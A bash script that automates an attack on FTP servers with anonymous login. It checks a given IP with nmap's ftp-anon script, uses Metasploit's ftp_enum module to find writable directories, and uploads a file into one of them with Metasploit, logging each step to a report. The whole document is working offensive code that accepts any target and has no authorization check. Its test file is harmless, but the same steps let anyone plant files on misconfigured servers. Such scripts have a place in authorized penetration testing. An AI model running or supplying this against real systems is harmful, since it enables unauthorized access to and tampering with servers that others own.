#!/bin/bash

# This script tries to exploit an FTP server with anonymous login enabled
# Automatically log into the ftp server
# Check for writable directories
# Create a report file


# Check if IP address argument is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <ip_address>"
    exit 1
fi

IP="$1"

# Create a report file
EXPLOIT_REPORT="exploit_report_for_${IP}.txt"
echo "Exploit Report for $IP" >"$EXPLOIT_REPORT"
echo "-----------------------------------------" >>"$EXPLOIT_REPORT"

# Step 1: Check for anonymous login using nmap
echo "Checking for anonymous login on $IP using nmap..." | tee -a "$EXPLOIT_REPORT"
nmap -p 21 --script=ftp-anon "$IP" -oN nmap_anon_check_$IP.txt
anon_result=$(grep "Anonymous FTP login allowed" nmap_anon_check_$IP.txt)

if [ -n "$anon_result" ]; then
    echo "Anonymous login allowed on $IP" | tee -a "$EXPLOIT_REPORT"

    # Step 2: Check for writable directories using Metasploit
    echo "Checking for writable directories on $IP..." | tee -a "$EXPLOIT_REPORT"
    writable_dirs=$(msfconsole -q -x "
        use auxiliary/scanner/ftp/ftp_enum
        set RHOSTS $IP
        set USERNAME anonymous
        set PASSWORD anonymous
        run
        exit
    " | grep "writable")

    if [ -n "$writable_dirs" ]; then
        echo "Writable directories found on $IP:" | tee -a "$EXPLOIT_REPORT"
        echo "$writable_dirs" | tee -a "$EXPLOIT_REPORT"

        # Extract the first writable directory
        writable_dir=$(echo "$writable_dirs" | awk '{print $5}' | head -n 1)
        echo "Injecting file into writable directory: $writable_dir" | tee -a "$EXPLOIT_REPORT"

        # Step 3: Inject a text file saying "Hello world from exploit test"
        echo "Hello world from exploit test" >hello.txt
        msfconsole -q -x "
            use auxiliary/admin/ftp/ftp_put
            set RHOSTS $IP
            set RPORT 21
            set USERNAME anonymous
            set PASSWORD anonymous
            set FTPFILE hello.txt
            set DESTINATION $writable_dir/hello.txt
            run
            exit
        " | tee -a "$EXPLOIT_REPORT"
        rm hello.txt

    else
        echo "No writable directories found on $IP." | tee -a "$EXPLOIT_REPORT"
    fi

else
    echo "Anonymous login not allowed on $IP. Exploitation not possible." | tee -a "$EXPLOIT_REPORT"
fi

# Cleanup intermediate files
rm nmap_anon_check_$IP.txt

echo "Exploitation script completed. Report saved to $EXPLOIT_REPORT."
